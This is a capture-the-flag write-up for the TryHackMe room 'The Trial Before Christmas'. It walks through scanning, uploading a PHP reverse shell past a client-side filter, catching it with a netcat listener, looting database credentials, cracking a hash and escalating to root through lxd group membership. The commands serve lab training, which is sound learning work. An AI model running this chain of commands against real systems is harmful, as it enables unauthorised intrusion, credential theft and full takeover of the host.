# The Trial Before Christmas

- Scan the machine. What ports are open?

	- `scilla port -target <TARGET_IP>`, [scilla here](https://github.com/edoardottt/scilla)
	- `80, 65000`

- What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.

	- `http://<TARGET_IP>:65000`
	- `Light Cycle`

- What is the name of the hidden php page?

	- `gobuster dir -u http://<TARGET_IP>:65000 -x .php -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
	- `uploads.php`

- What is the name of the hidden directory where file uploads are saved?

	- `scilla dir -target http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
	- `grid`

- Bypass the filters. Upload and execute a reverse shell.

	  no answer needed

	- Navigate to `http://<TARGET_IP>:65000/uploads.php`
	- Download [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
	- Change the ip from the default to yours ip.
	- Upload the file.
	- Damn. Invalid file.
	- Let's look to the validation.
	- Found `assets/js/filter.js`.
	~~~
	const filter = file => {
		if(["image/png", "image/jpeg", "image/jpg"].indexOf(file.type) < 0){
			return false;
		} else if (["png", "jpeg", "jpg"].indexOf(file.name.split(".").pop()) < 0){
			return false;
		}

		//Let's be honest -- these things are dangerous. May as well always return false Â¯\_(ãƒ„)_/Â¯
		return false;

	}
	~~~
	- This instead in `upload.js`
	~~~
	const upload = () => {
	let file = uploadInput.files[0];
	if(typeof filter === "function"){
		if(!filter(file)){
			changeMsg("Invalid File Type");
			return;
		}
	}
	~~~
	- Mhhh...
	- And here we are: `accept=".png,.jpg,.jpeg"`
	- Rename that file to `rshell.jpg.php`
	- We have to avoid the download/usage of `filter.js`.
	- We can block it using the Developers Tools (F12) or using Burp.
	- *tips* If you are having trouble, clear all the cache/data in browser.
	- Move to `http://<TARGET_IP>:65000/grid/`
	- On your machine `nc -lnvp 1234`
	- Click on the uploaded file.

- What is the value of the web.txt flag?

	- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	- `cat /var/www/web.txt`
	- `THM{**************}`

- Upgrade and stabilize your shell.

	  no answer needed
	
	- Referred to the first command of the previous task (`python3...`).

- Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

	- `cd /var/www/TheGrid`
	- `ls -alh`
	- `cd includes`
	- `cat dbauth.php`
	- `tron:I****************`

- Access the database and discover the encrypted credentials. What is the name of the database you find these in?

	- `mysql -u tron -p`
	- Enter the password.
	- `show databases;`
	- `tron`

- Crack the password. What is it?

	- `show tables;`
	- `use users;`
	- `select * from users;`
	~~~
	+----+----------+----------------------------------+
	| id | username | password                         |
	+----+----------+----------------------------------+
	|  1 | flynn    | ed*********d19a13*********	   |
	+----+----------+----------------------------------+
	~~~
	- `hash-identifier`
	- [crackstation](https://crackstation.net/)
	- `**********`

- Use su to login to the newly discovered user by exploiting password reuse.

	  no answer needed

	- Exit from mysql client with `exit`.
	- `su flynn`
	- Enter the password

- What is the value of the user.txt flag?

	- `cd ~`
	- `ls`
	- `cat flag.txt`
	- `THM{********_****_***********}`

- Check the user's groups. Which group can be leveraged to escalate privileges?

	- `id`
	- `lxd`

- Abuse this group to escalate privileges to root.

	  no answer needed

	- Check with `lxc image list` on target machine which containers are available locally.
	~~~
	+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
	| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
	+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
	| Alpine | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB | Dec 20, 2020 at 3:51am (UTC) |
	+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
	~~~
	- `lxc init IMAGENAME CONTAINERNAME -c security.privileged=true`
	- `lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true`
	- `lxc start CONTAINERNAME`
	- `lxc exec CONTAINERNAME /bin/sh`
	- `id`	

- What is the value of the root.txt flag?

	- `cd /mnt/root/root`
	- `THM{***********}`

	~~~
	"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!"
	~~~


### see you ...
